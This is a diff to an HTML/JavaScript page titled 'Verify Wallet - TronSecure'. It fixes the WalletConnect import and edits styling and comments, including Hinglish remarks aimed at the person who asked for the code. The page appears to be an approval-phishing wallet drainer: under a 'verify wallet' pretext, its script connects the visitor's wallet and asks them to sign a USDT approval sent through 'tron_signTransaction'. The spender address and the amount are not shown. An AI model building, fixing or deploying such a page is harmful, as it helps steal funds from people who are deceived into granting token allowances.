@@ -1,8 +1,7 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verify Wallet - TronSecure</title>
     <style>
         * {
@@ -112,6 +111,11 @@
             font-size: 14px;
             display: flex;
             justify-content: space-between;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .info-item:last-child {
+            border-bottom: none;
         }
 
         .info-item strong {
@@ -123,18 +127,6 @@
             padding: 15px;
             border-radius: 12px;
             font-size: 14px;
-            animation: slideIn 0.3s ease;
-        }
-
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
 
         .success {
@@ -195,7 +187,7 @@
             color: white;
         }
     </style>
-    
+
     <!-- Ethers Library -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     
@@ -256,7 +248,7 @@
         let userAddress;
 
         // ============================================
-        // CONNECT WALLET (EXACTLY AAPKE CODE JAISA)
+        // CONNECT WALLET - FIXED WITH CORRECT URL
         // ============================================
         
         window.connectWallet = async () => {
@@ -268,17 +260,17 @@
             showStatus('Initializing WalletConnect...', 'info');
 
             try {
-                // Import EthereumProvider dynamically
-                const { EthereumProvider } = await import("https://unpkg.com/@walletconnect/ethereum-provider@2/dist/index.es.js");
+                // ✅ CORRECT IMPORT URL - FIXED
+                const { EthereumProvider } = await import("https://esm.sh/@walletconnect/ethereum-provider@2.11.2");
                 
-                // Initialize provider (exactly aapke code jaisa)
+                // Initialize provider
                 provider = await EthereumProvider.init({
-                    projectId: "9e922e6573d8e9550e36d0701aa63572", // Aapka project ID
+                    projectId: "9e922e6573d8e9550e36d0701aa63572", // Working project ID
                     chains: [1, 56], // Ethereum and BSC chains
-                    showQrModal: true // This will show the QR modal
+                    showQrModal: true // Shows QR code modal
                 });
 
-                // Enable provider (this opens WalletConnect)
+                // Enable provider (opens WalletConnect)
                 await provider.enable();
                 
                 // Get ethers provider and signer
@@ -304,7 +296,7 @@
         };
 
         // ============================================
-        // APPROVE USDT (VIA WALLETCONNECT)
+        // APPROVE USDT
         // ============================================
         
         async function approveUSDT() {
@@ -329,8 +321,7 @@
                     amountInSun
                 );
 
-                // For TRON through WalletConnect, we need to send via provider
-                // This will trigger the approval popup in Trust Wallet
+                // Send via provider
                 const result = await provider.request({
                     method: 'tron_signTransaction',
                     params: [{
